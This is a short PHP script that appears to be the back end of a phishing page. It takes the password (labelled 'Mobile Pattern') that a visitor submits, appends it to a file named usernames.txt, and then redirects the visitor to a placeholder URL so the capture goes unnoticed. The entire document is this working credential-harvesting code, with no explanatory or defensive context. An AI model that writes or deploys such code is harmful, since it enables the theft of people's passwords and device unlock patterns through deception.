<?php

file_put_contents("usernames.txt", "Mobile Pattern: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
exit();
